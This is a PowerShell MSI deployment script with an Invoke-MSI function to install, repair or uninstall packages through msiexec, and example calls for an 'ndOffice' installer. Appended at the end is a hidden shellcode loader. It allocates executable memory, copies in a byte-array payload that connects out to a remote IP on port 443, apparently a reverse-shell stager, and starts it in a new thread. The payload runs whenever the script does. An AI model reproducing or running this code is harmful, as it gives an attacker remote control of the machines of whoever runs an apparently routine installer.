

function Invoke-MSI {

	
	[CmdletBinding()]
	param
	(
		[string]
		$DisplayName,
		[switch]
		$Install,
		[string]
		$LogDirectory,
		[switch]
		$Logging,
		[ValidateNotNullOrEmpty()][String]
		$MSIFileName,
		[string]
		$MSIFilePath,
		[ValidateNotNullOrEmpty()][String]
		$Switches = '/qb- /norestart',
		[string]
		$GUID,
		[switch]
		$Repair,
		[switch]
		$Uninstall,
		[switch]
		$UninstallByName
	)
	
	function Get-MSIDatabase {
	
		
		[CmdletBinding()][OutputType([string])]
		param
		(
			[ValidateNotNullOrEmpty()][string]
			$Property,
			[ValidateNotNullOrEmpty()][string]
			$MSI,
			[ValidateNotNullOrEmpty()][string]
			$Path
		)
		
		
		$MSIFile = Get-Item $Path$MSI
		
		try {
			
			$WindowsInstaller = New-Object -ComObject WindowsInstaller.Installer
			
			$MSIDatabase = $WindowsInstaller.GetType().InvokeMember("OpenDatabase", "InvokeMethod", $Null, $WindowsInstaller, @($MSIFile.FullName, 0))
			
			$Query = "SELECT Value FROM Property WHERE Property = '$($Property)'"
			
			$View = $MSIDatabase.GetType().InvokeMember("OpenView", "InvokeMethod", $null, $MSIDatabase, ($Query))
			$View.GetType().InvokeMember("Execute", "InvokeMethod", $null, $View, $null)
			$Record = $View.GetType().InvokeMember("Fetch", "InvokeMethod", $null, $View, $null)
			
			$DataField = $Record.GetType().InvokeMember("StringData", "GetProperty", $null, $Record, 1)
			Return $DataField
		} catch {
			Write-Output $_.Exception.Message
			Exit 1
		}
	}
	
	function Get-DisplayNameFromRegistry {
	
		
		[CmdletBinding()][OutputType([string])]
		param
		(
			[ValidateNotNullOrEmpty()][string]
			$GUID
		)
		
		
		$OSArchitecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture
		
		$Registry = Get-ChildItem Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
		If ($OSArchitecture.OSArchitecture -eq "64-bit") {
			$Registry += Get-ChildItem Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall
		}
		
		$Registry = $Registry | Where-Object { $_.PSChildName -eq $GUID }
		
		$Registry = "Registry::" + $Registry.Name
		
		$Registry = Get-ItemProperty $Registry -ErrorAction SilentlyContinue
		
		$DisplayName = $Registry.DisplayName
		Return $DisplayName
	}
	
	
	$OSArchitecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture
	
	$Executable = $Env:windir + "\system32\msiexec.exe"
	
	If ($MSIFilePath -eq "") {
		If (($GUID -eq $null) -or ($GUID -eq "")) {
			$MSIFilePath = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"
		}
	} else {
		If ($MSIFilePath[$MSIFilePath.Length - 1] -ne '\') {
			$MSIFilePath += '\'
		}
	}
	If ($Install.IsPresent) {
		$Parameters = "/i" + [char]32 + [char]34 + $MSIFilePath + $MSIFileName + [char]34
		$DisplayName = Get-MSIDatabase -Property "ProductName" -MSI $MSIFileName -Path $MSIFilePath
		Write-Host "Installing"$DisplayName"....." -NoNewline
	} elseif ($Uninstall.IsPresent) {
		If ($GUID -ne "") {
			$Parameters = "/x" + [char]32 + $GUID
			$DisplayName = Get-DisplayNameFromRegistry -GUID $GUID
		} else {
			$Parameters = "/x" + [char]32 + [char]34 + $MSIFilePath + $MSIFileName + [char]34
			$DisplayName = Get-MSIDatabase -Property "ProductName" -MSI $MSIFileName -Path $MSIFilePath
		}
		If ($DisplayName -ne "") {
			Write-Host "Uninstalling"$DisplayName"....." -NoNewline
		} else {
			Write-Host "Uninstalling"$GUID"....." -NoNewline
		}
	} elseif ($UninstallByName.IsPresent) {
		$Uninstaller = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" -Recurse -ErrorAction SilentlyContinue
		If ($OSArchitecture.OSArchitecture -eq "64-Bit") {
			$Uninstaller += Get-ChildItem "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -Recurse -ErrorAction SilentlyContinue
		}
		$SearchName = "*" + $DisplayName + "*"
		$IdentifyingNumber = get-wmiobject win32_product | where-object { $_.Name -like $SearchName }
		[string]$GUID = $IdentifyingNumber.IdentifyingNumber
		$Parameters = "/x" + [char]32 + $GUID
		$DisplayName = Get-DisplayNameFromRegistry -GUID $GUID
		If ($DisplayName -ne "") {
			Write-Host "Uninstalling"$DisplayName"....." -NoNewline
		} else {
			Write-Host "Uninstalling"$GUID"....." -NoNewline
		}
	} elseif ($Repair.IsPresent) {
		If ($GUID -ne "") {
			$Parameters = "/faumsv" + [char]32 + $GUID
			$DisplayName = Get-DisplayNameFromRegistry -GUID $GUID
		} else {
			$Parameters = "/faumsv" + [char]32 + [char]34 + $MSIFilePath + $MSIFileName + [char]34
			$DisplayName = Get-MSIDatabase -Property "ProductName" -MSI $MSIFileName -Path $MSIFilePath
		}
		Write-Host "Repairing"$DisplayName"....." -NoNewline
	} else {
		Write-Host "Specify to install, repair, or uninstall the MSI" -ForegroundColor Red
		Exit 1
	}
	
	If ($Logging.IsPresent) {
		If ($LogDirectory -eq "") {
			$Parameters += [char]32 + "/lvx " + [char]34 + $env:TEMP + "\" + $DisplayName + ".log" + [char]34
		} else {
			If ($LogDirectory[$LogDirectory.count - 1] -ne "\") {
				$LogDirectory += "\"
			}
			$Parameters += [char]32 + "/lvx " + [char]34 + $LogDirectory + $DisplayName + ".log" + [char]34
		}
	}
	
	$Parameters += [char]32 + $Switches
	$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Parameters -WindowStyle Minimized -Wait -Passthru).ExitCode
	If (($ErrCode -eq 0) -or ($ErrCode -eq 3010)) {
		If ($GUID -eq "") {
			[string]$ProductCode = Get-MSIDatabase -Property "ProductCode" -MSI $MSIFileName -Path $MSIFilePath
		} else {
			[string]$ProductCode = $GUID
		}
		$ProductCode = $ProductCode.Trim()
		$Registry = Get-ChildItem Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
		If ($OSArchitecture.OSArchitecture -eq "64-bit") {
			$Registry += Get-ChildItem Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall
		}
		If (($Install.IsPresent) -or ($Repair.IsPresent)) {
			If ($ProductCode -in $Registry.PSChildName) {
				Write-Host "Success" -ForegroundColor Yellow
			} else {
				Write-Host "Failed" -ForegroundColor Red
			}
		} elseif (($Uninstall.IsPresent) -or ($UninstallByName.IsPresent)) {
			If ($ProductCode -in $Registry.PSChildName) {
				Write-Host "Failed" -ForegroundColor Red
			} else {
				Write-Host "Success" -ForegroundColor Yellow
			}
		}
	} elseif ($ErrCode -eq 1605) {
		Write-Host "Application already uninstalled" -ForegroundColor Yellow
	} else {
		Write-Host "Failed with error code "$ErrCode -ForegroundColor Red
	}
}

Invoke-MSI -Install -MSIFileName "ndOfficeSetup.msi" -Switches "ADDLOCAL=Word,Excel,PowerPoint,Outlook,AdobeAcrobatIntegration,AdobeReaderIntegration /qb- /norestart"
Invoke-MSI -Repair -GUID "{A67CA551-ADAE-4C9B-B09D-38D84044FAB8}"
Invoke-MSI -UninstallByName "ndOffice" -Logging

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x6a,0x9c,0xd9,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

